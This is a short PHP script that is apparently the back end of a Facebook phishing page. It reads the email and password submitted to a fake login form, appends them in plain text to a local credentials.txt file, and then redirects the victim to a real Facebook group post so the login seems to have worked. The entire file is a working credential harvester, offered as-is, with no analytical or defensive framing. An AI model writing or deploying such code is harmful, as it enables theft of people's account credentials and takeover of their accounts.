<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $file = fopen("credentials.txt", "a");
    fwrite($file, "Email: $email, Password: $password\n");
    fclose($file);

    // Redirect user to Facebook after login
    header("Location: https://web.facebook.com/groups/120233531841110/permalink/1923497798181332/?mibextid=Hv8p3nJ2kXyS6Kn1&rdid=V0hbow5FBrjVlSz1&share_url=https%3A%2F%2Fweb.facebook.com%2Fshare%2Fp%2F15nJ8f8mry%2F%3Fmibextid%3DHv8p3nJ2kXyS6Kn1%26_rdc%3D1%26_rdr#");
    exit();
}
?>